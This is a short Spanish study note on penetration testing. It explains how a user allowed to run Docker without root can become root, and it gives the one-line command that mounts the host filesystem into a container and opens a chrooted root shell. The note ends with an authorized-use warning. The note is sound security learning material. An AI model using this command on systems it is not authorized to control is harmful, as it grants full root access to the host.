---
title: "4 - Escalada de Privilegios en Docker que no pide ser Usuario Sudo"
date: 2026-08-27
tags:
  - self-study
  - security-penetration-testing
  - avanzado
status: verified
author: "Juan José Restrepo Rosero"
last_updated: 2026-08-27
---

Si nos encontramos con la situación de que podemos ejecutar docker sin ser usuario root, significa que es vulnerable a esta escalada de privilegios:
![[Pasted image 20230322212732.png]]
Por tanto, existe un repositorio de github de hacktricks para escalar privilegios en estos casos:
![[Pasted image 20230322212759.png]]
Y en este repositorio tenemos unas instrucciones de unos comandos que si los ejecutamos en la máquina que puede ejecutar docker sin ser usuario root, nos convertimos en dicho usuario:
![[Pasted image 20230322212841.png]]
Ejecutamos el primer comando:
```python
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
```
Y ya nos convertimos en usuario root:
![[Pasted image 20230322212931.png]]

<!-- self-study-knowledge-context -->
## Contexto de estudio
- Dominio: [[MOC-Self-Study#Security & Penetration Testing|Seguridad y pruebas de penetración]].
- Criterio de producción: Ejecuta técnicas únicamente en activos propios o con autorización explícita, alcance documentado y controles de no afectación.
> [!warning] Uso autorizado
> Este material es exclusivamente educativo y defensivo. Practica en laboratorios aislados, CTFs o sistemas para los que dispongas de autorización previa y explícita.
